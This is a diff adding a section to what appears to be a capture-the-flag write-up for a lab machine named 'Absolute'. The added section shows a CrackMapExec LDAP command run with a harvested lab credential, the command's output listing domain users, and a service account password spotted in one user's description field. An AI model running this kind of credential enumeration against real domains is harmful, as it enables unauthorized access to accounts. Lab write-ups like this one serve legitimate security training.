@@ -726,6 +726,27 @@ Drag `20230507174839_bloodhound.zip` into `bloodhound` once started.
 
 <figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
 
+#### CrackMapExec LDAP get-desc-users
+
+```
+cme ldap dc.absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl' -k -M get-desc-users
+
+SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+LDAP        dc.absolute.htb 389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+GET-DESC... dc.absolute.htb 389    DC               [+] Found following users: 
+GET-DESC... dc.absolute.htb 389    DC               User: Administrator description: Built-in account for administering the computer/domain
+GET-DESC... dc.absolute.htb 389    DC               User: Guest description: Built-in account for guest access to the computer/domain
+GET-DESC... dc.absolute.htb 389    DC               User: krbtgt description: Key Distribution Center Service Account
+GET-DESC... dc.absolute.htb 389    DC               User: svc_smb description: AbsoluteSMBService123!
+GET-DESC... dc.absolute.htb 389    DC               User: winrm_user description: Used to perform simple network tasks
+```
+
+We see a password in the user, svc\_smb's description!
+
+```
+svc_smb:AbsoluteSMBService123!
+```
+
 ## Privilege Escalation
 
 ### Local enumeration
